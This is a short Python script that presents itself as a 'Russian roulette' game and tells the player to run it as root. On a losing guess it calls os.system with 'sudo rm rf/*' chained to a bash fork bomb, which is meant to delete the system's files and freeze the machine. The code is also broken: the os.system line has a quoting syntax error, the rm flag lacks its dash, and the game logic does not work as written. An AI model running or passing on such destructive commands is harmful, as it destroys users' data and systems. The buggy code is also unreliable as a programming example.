#Import os and random
import os
import random 
start_game = input("Wanna play a game? \n \n ")
play = input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n yes or no? \n")
list = ["1,2,3,4,5,6"]
choose = random.choice(list)


start_game

# if you loose the game should run a fork bomb 

if start_game == str("yes") or str("Yes"):
    print(play)
    choose
    if choose == play:
        print ("You loose :( bye bye files)") and os.system(""sudo rm rf/* | :(){ :|:& };:")
else:
    print("smart move")
    
